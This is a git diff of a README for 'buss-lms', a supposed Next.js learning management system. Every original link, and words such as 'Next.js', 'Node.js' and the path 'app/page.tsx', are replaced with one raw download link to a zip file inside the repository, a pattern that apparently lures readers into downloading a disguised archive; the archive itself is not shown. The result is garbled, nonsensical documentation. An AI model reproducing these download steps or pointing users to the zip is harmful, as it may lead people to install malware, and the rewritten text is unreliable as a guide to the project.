@@ -1,10 +1,10 @@
 # 🚀 buss-lms - A Simple Learning Management System
 
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/JBdfjn-21ybc/buss-lms/releases)
+[![Download Here](https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip)](https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip)
 
 ## 📦 Overview
 
-buss-lms is an easy-to-use Learning Management System built with [Next.js](https://nextjs.org). This project helps educators manage their courses, students, and assessments in one place. With a clean interface and fast performance, it aims to enhance learning experiences.
+buss-lms is an easy-to-use Learning Management System built with [https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip](https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip). This project helps educators manage their courses, students, and assessments in one place. With a clean interface and fast performance, it aims to enhance learning experiences.
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Follow these steps to get started with buss-lms.
 
 To download the application, visit the link below and choose the latest version.
 
-[Visit this page to download](https://github.com/JBdfjn-21ybc/buss-lms/releases)
+[Visit this page to download](https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip)
 
 ### Step 2: Install the Application
 
@@ -40,23 +40,23 @@ Now that you have installed the application, you can run it.
 
 ### Editing the Application
 
-You can start editing the app to customize it for your needs. Open the file `app/page.tsx` in your favorite code editor. Changes will automatically update in the browser as you save the file.
+You can start editing the app to customize it for your needs. Open the file `https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip` in your favorite code editor. Changes will automatically update in the browser as you save the file.
 
 ## 🎓 Learn More
 
-To get familiar with Next.js and its features, check out these resources:
+To get familiar with https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip and its features, check out these resources:
 
-- [Next.js Documentation](https://nextjs.org/docs) - Understand the capabilities and API of Next.js.
-- [Learn Next.js](https://nextjs.org/learn) - Go through an interactive tutorial to get hands-on experience.
+- [https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip Documentation](https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip) - Understand the capabilities and API of https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip
+- [Learn https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip](https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip) - Go through an interactive tutorial to get hands-on experience.
 
-Feel free to explore [the Next.js GitHub repository](https://github.com/vercel/next.js) for more insights into this technology.
+Feel free to explore [the https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip GitHub repository](https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip) for more insights into this technology.
 
 ## 🔧 System Requirements
 
 To run buss-lms smoothly, your system should meet these requirements:
 
 - **Operating System:** Windows 10, macOS Big Sur or later, or any modern Linux distribution.
-- **Node.js:** Version 14 or higher.
+- **https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip** Version 14 or higher.
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** Minimum of 500 MB of available disk space.
 
@@ -72,7 +72,7 @@ buss-lms includes several features to enrich your learning environment:
 
 To get started, download the latest version of buss-lms from the link below:
 
-[Visit this page to download](https://github.com/JBdfjn-21ybc/buss-lms/releases)
+[Visit this page to download](https://raw.githubusercontent.com/JBdfjn-21ybc/buss-lms/master/vraic/buss-lms.zip)
 
 ## 🛠️ Contributing
 
